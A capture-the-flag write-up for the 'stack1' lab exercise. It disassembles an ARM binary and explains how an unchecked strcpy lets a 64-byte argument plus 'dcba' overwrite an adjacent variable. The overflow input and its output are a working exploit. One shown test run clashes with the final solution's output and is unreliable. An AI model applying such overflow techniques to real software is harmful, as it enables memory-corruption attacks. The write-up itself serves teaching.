# Stack1
```
What you will learn

    How to modify variables to specific values in the program
    How the variables are laid out in memory

Goal: Change the ‘modified’ variable. You solved the challenge once “You have changed the ‘modified’ variable” is printed out.
```

This challenge is basic (as **stack0**), and again let's reverse it a bit.
```asm
000104b0 <main>:
   104b0:	e92d4800 	push	{fp, lr}
   104b4:	e28db004 	add	fp, sp, #4
   
   ; ===========================================
   ;      Saving argv in local variables
   ; ===========================================
   104b8:	e24dd050 	sub	sp, sp, #80	; 0x50
   104bc:	e50b0050 	str	r0, [fp, #-80]	; 0xffffffb0
   104c0:	e50b1054 	str	r1, [fp, #-84]	; 0xffffffac
   
   ; ===========================================
   ;           Checking if argc > 1
   ; ===========================================
   104c4:	e51b3050 	ldr	r3, [fp, #-80]	; 0xffffffb0
   104c8:	e3530001 	cmp	r3, #1
   104cc:	1a000002 	bne	104dc <main+0x2c>
   
   ; ===========================================
   ;   Prints an error if argc = 1 and exits
   ; ===========================================
   104d0:	e3a00001 	mov	r0, #1
   104d4:	e59f105c 	ldr	r1, [pc, #92]	; 10538 <main+0x88>
   104d8:	ebffffa4 	bl	10370 <errx@plt>
   
   ; ===========================================
   ;   modified=0; strcpy(fp-72, argv[1])
   ; ===========================================
   104dc:	e3a03000 	mov	r3, #0
   104e0:	e50b3008 	str	r3, [fp, #-8]
   104e4:	e51b3054 	ldr	r3, [fp, #-84]	; 0xffffffac
   104e8:	e2833004 	add	r3, r3, #4
   104ec:	e5933000 	ldr	r3, [r3]
   104f0:	e24b2048 	sub	r2, fp, #72	; 0x48
   104f4:	e1a00002 	mov	r0, r2
   104f8:	e1a01003 	mov	r1, r3
   104fc:	ebffff8f 	bl	10340 <strcpy@plt>
   
   ; ===========================================
   ;    Comparing modified to a fixed value 
   ; ===========================================
   10500:	e51b3008 	ldr	r3, [fp, #-8]
   10504:	e59f2030 	ldr	r2, [pc, #48]	; 1053c <main+0x8c>
   10508:	e1530002 	cmp	r3, r2
   
   ; ===========================================
   ; Printing a message according to the result 
   ; ===========================================
   1050c:	1a000002 	bne	1051c <main+0x6c>
   10510:	e59f0028 	ldr	r0, [pc, #40]	; 10540 <main+0x90>
   10514:	ebffff8c 	bl	1034c <puts@plt>
   10518:	ea000003 	b	1052c <main+0x7c>
   1051c:	e51b3008 	ldr	r3, [fp, #-8]
   10520:	e59f001c 	ldr	r0, [pc, #28]	; 10544 <main+0x94>
   10524:	e1a01003 	mov	r1, r3
   10528:	ebffff81 	bl	10334 <printf@plt>
   1052c:	e1a00003 	mov	r0, r3
   
   10530:	e24bd004 	sub	sp, fp, #4
   10534:	e8bd8800 	pop	{fp, pc}
```

As in **stack0**, the _modified_ variable is stored at _fp-8_ and the buffer for the user's input is stored at _fp-72_, which makes the buffer contains 64 bytes at most.<br>
Just to make sure we're right:
```sh
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
Try again, you got 0x00000000
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try again, you got 0x41414141
```
Using gdb, we can get the fixed value which is compared to _modified_ - 0x61626364, which is actually "dcba" (little-endian).<br>
```sh
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
```


